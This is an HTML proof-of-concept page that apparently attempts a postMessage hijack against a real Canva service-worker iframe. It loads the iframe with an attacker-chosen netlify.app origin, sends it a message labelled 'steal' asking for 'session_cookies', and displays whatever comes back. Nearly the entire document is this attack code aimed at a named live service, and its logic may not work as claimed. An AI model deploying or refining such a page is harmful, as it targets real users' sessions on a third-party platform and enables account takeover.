<!DOCTYPE html>
<html>
<head><title>postMessage Hijack PoC</title></head>
<body>
  <h2>Iframe Hijack PoC</h2>
  <iframe id="targetFrame" src="https://ct.canva.com/_/service_worker/5510/sw_iframe.html?origin=https://heroic-pastelito-45712a.netlify.app" style="width:100%; height:300px;"></iframe>

  <script>
    // Wait a bit for iframe to load and SW to register
    setTimeout(() => {
      const iframe = document.getElementById("targetFrame");
      iframe.contentWindow.postMessage({type: "steal", data: "session_cookies"}, "https://canva.com");
    }, 2000);

    // Listen for echoed response from iframe
    window.addEventListener("message", (event) => {
      if (event.origin === "https://canva.com") {
        alert("Received message from victim iframe:\n" + JSON.stringify(event.data));
      }
    });
  </script>
</body>
</html>
